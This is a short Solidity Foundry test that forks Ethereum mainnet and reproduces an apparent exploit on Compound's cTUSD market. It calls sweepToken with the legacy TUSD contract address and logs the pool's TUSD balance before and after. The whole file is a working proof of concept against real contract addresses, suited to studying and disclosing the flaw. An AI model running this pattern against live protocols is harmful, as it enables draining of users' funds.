// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    ICErc20Delegate cTUSD = ICErc20Delegate(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    IERC20 tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_266_479); // fork mainnet at block 14266479
    }

    function testExample() public {
        emit log_named_uint("Before exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
        cTUSD.sweepToken(tusdLegacy);
        emit log_named_uint("After exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
    }
}
